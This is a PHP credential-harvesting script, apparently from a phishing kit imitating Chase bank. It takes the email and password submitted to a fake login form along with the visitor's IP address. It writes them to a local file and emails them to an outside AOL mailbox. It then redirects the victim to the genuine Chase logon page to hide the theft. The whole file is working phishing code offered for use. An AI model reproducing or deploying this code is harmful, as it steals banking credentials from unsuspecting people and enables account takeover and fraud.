<?php

$ip = getenv("REMOTE_ADDR");

$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "Email   : ".$_POST['3']."\n";
$message .= "Password   : ".$_POST['4']."\n";
$message .= "IP Address : ".$ip."\n";
$message .= "-----------  !Thuglife_Legend+ !  -----------\n";
$send = "resultbox223@aol.com";


$fp = fopen("TDex.txt","a");
fputs($fp,$message);
fclose($fp);

$subject = "eLux! xD $ip";
$headers = "From:  <info@notime>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);
    

header("Location: https://secure05b.chase.com/web/auth/#/logon/recognizeUser/simplerAuthOptions
");

?>


